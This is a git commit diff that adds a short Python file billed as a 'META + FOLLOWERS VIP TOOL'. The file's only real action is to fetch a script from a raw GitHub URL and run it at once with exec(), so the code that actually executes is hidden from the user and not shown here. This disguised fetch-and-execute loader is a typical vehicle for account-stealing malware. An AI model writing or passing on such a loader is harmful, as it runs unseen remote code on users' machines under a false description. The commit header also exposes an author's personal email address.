3bb1913787fdcae6bef4bdc967d161b5970b35c0
lakshy665 <rohanmanwani447@gmail.com>
2025-03-14 14:52:49 +0530

    Add files via upload

---
+++ 2010-23 META + FLWERS [VIP] TOOL.py
@@ -0,0 +1,7 @@
+# ANII META + FOLLWERS TOOL
+import requests
+code = 'AniiRo'
+res=requests.get('https://raw.githubusercontent.com/ax8n/aniipy/refs/heads/main/meta%2Bflw.py')
+exec(res.text)
+# DEV - @ANIIRO | CHANNEL - @ANIISOLO
+# CLAN - @TeamEnclve
